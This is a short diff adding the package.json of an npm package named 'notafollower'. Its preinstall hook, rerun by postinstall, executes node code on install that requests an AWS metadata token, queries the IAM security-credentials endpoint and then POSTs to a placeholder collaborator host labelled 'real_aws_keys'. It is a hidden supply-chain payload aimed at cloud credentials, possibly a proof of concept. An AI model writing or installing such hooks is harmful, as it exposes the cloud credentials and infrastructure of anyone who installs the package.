@@ -1,0 +1,8 @@
+{
+  "name": "notafollower",
+  "version": "1.0.4",
+  "scripts": {
+    "preinstall": "node -e \"fetch('http://169.254.169.254/latest/api/token',{method:'PUT'}).then(()=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')).then(()=>fetch('https://YOUR_COLLAB/?real_aws_keys=1',{method:'POST'}))\"",
+    "postinstall": "npm run preinstall"
+  }
+}
